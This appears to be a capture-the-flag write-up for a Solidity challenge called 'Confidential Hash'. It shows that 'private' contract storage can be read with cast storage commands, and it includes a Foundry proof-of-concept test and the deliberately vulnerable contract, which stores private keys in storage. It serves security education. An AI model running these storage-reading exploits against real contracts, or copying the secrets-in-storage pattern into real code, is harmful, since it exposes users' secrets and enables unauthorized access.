## Confidential Hash attack

The private variables needed to calculdate the keccak256 can be read from the blockchain.

```bash
ALICE_PRIVATE_KEY is on storage slot 2
aliceHash is on storage slot 4

BOB_PRIVATE_KEY is on storage slot 7
bobHash is on storage slot 9
```

To get them you can use cast or other options to read storage slots.

With this we can get **aliceHash** and **bobHash** to calculate the keccakt256
```bash
cast storage 0xf8e9327e38ceb39b1ec3d26f5fad09e426888e66 4 
=> 0x448e5df1a6908f8d17fae934d9ae3f0c63545235f8ff393c6777194cae281478

cast storage 0xf8e9327e38ceb39b1ec3d26f5fad09e426888e66 9 
=> 0x98290e06bee00d6b6f34095a54c4087297e3285d457b140128c1c2f3b62a41bd
```

To get the valid hash, we just need to calculcate the keccak256 from the two variables via
```solidity
bytes32 aliceHash = 0x448e5df1a6908f8d17fae934d9ae3f0c63545235f8ff393c6777194cae281478;
bytes32 bobHash = 0x98290e06bee00d6b6f34095a54c4087297e3285d457b140128c1c2f3b62a41bd;
bytes32 _validHash_ = keccak256(abi.encodePacked(aliceHash, bobHash));

// res = 0x9ef416df0fda1100f986a774a4b5e98862857d91600d4f615de7187c70d2b7bf
```

The valid hash is **0x9ef416df0fda1100f986a774a4b5e98862857d91600d4f615de7187c70d2b7bf**


## Test
forge test --match-contract=PocHashCollisionTest
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

contract PocHashCollisionTest is Test {

    Confidential public confidential;

    function setUp() public {
        confidential = new Confidential();
    }

    bytes32 aliceHash = 0x448e5df1a6908f8d17fae934d9ae3f0c63545235f8ff393c6777194cae281478;
    bytes32 bobHash = 0x98290e06bee00d6b6f34095a54c4087297e3285d457b140128c1c2f3b62a41bd;

    function testHashForAlicAndBobMatch() public {
        // check storage slot 4
        assertEq(
            confidential.hash(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80, "QWxpY2UK"), 
            aliceHash, // aliceHash
            "alice hash?"
        );

        // check storage slot 9
        assertEq(
            confidential.hash(0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6, "Qm9iCg"), 
            bobHash, // bobHash
            "bob hash?"
        );
    }

    function testHashCollisionOnContract() public {
        bytes32 weWillPass = keccak256(abi.encodePacked(aliceHash, bobHash));
        //console.logBytes32(weWillPass);

        // res: 0x9ef416df0fda1100f986a774a4b5e98862857d91600d4f615de7187c70d2b7bf
        assertTrue(confidential.checkthehash(weWillPass));
    }
}

contract Confidential {
    string public firstUser = "ALICE";
    uint public alice_age = 24;
	
    // cast storage 0xf8e9327e38ceb39b1ec3d26f5fad09e426888e66 2
    bytes32 private ALICE_PRIVATE_KEY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    
    bytes32 public ALICE_DATA = "QWxpY2UK";

    // cast storage 0xf8e9327e38ceb39b1ec3d26f5fad09e426888e66 4
    bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA); // 0x448e5df1a6908f8d17fae934d9ae3f0c63545235f8ff393c6777194cae281478

    string public secondUser = "BOB";
    uint public bob_age = 21;

    // cast storage 0xf8e9327e38ceb39b1ec3d26f5fad09e426888e66 7
    bytes32 private BOB_PRIVATE_KEY = 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6;
    bytes32 public BOB_DATA = "Qm9iCg";

    // cast storage 0xf8e9327e38ceb39b1ec3d26f5fad09e426888e66 9
    bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA); // 0x98290e06bee00d6b6f34095a54c4087297e3285d457b140128c1c2f3b62a41bd
		
    constructor() {}

    function hash(bytes32 key1, bytes32 key2) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(key1, key2));
    }

    function checkthehash(bytes32 _hash) public view returns(bool) {
        require (_hash == hash(aliceHash, bobHash));
        return true;
    }
}
```